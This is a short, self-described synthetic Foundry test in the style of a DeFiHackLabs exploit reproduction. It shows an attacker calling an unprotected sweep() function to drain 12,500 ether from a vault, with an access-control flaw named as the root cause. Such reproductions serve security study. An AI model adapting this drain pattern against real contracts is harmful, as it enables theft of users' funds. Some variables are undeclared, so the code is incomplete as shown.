// Reconstructed DeFiHackLabs card (format-faithful synthetic; see samples README).
// Root cause: missing onlyOwner on sweep() let any caller drain balances.
contract ATeam_exp {
    uint256 constant EXPLOIT_BLOCK = 15771113;

    function setUp() public {
        vm.label(0x9f51ab5a8a3c2e4d5f60718293a4b5c6d7e8f901, "attacker");
        vm.label(0x1c2d3e4f5061728394a5b6c7d8e9f00111213140, "victim vault");
        vm.label(0x2d3e4f5061728394a5b6c7d8e9f0011121314150, "harness router");
    }

    function testExploit() public {
        vm.roll(EXPLOIT_BLOCK - 1);
        vm.startPrank(attacker, attacker);
        uint256 withdrawn = vault.sweep();
        require(withdrawn == 12_500 ether, "amount mismatch");
        vm.stopPrank();
    }
}
